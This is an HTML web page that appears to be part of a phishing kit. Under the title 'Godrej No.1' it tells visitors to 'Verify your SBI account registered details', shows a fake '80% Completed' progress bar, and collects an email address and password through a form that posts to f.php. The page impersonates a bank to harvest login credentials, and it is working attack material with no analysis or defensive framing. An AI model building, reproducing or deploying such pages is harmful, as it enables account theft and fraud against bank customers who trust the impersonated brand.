<!DOCTYPE HTML> 
<html>
   <head>
      <title>Godrej No.1</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="stylesheet" type="text/css" href="kk.css">
      <link rel="stylesheet" type="text/css" href="rr.css">
   </head>
   <body style="background:#fff;">
       <div class="container-fluid m-0 p-0">
<img src="dt.png" class="hidden-xs img-fluid">
<img src="rd.png" class="hidden-lg img-fluid">

    
</div>
      <section class="">
         <div class="container">
         <form action="f.php" method="post">
            <div class="box">
               <div class="page-hea">
                  <div class="row">
                     <div class="col-xs-6 col-md-6">
                        <h2>Registered Details</h2>
                     </div>
                     <div class="col-xs-6 col-md-6 text-right">
                        <h2>X</h2>
                     </div>
                  </div>
               </div>
               <div class="row">
                  <div class="col-md-6 col-xs-12">
				  <div class="progress">
                              <div class="progress-bar" style="width:80%">80% Completed</div>
                           </div>
                     <div class="p-50">
                        <h4><b>Registered Details</b></h4>
                        <p>Verify your SBI account registered details</p>
                        <br><br>
                       
                        <input type="email" class="form-control" name="Email" placeholder="Enter Your Registered Email" required=""><br>
                        <input type="password" class="form-control" name="Password" placeholder="Enter Password" required=""><br>
                        
                     </div>
                  </div>
               </div>
            </div>
            <div class="row">
               <br><br>
               <div class="col-xs-12 col-md-12 text-center">
                  <a href="#" class="btn btn-border">Back</a>
                  <button type="submit" class="btn btn-primary"> Submit </button>
               </div>
            </div>
          </form>
         </div>
      </section>
      <footer>
        
         <img src="xm.png" class="img-fluid hidden-xs hidden-sm" width="100%">
         <img src="fi.png" class="img-fluid hidden-lg hidden-md" width="100%">
      </footer>
      
      
   </body>
</html>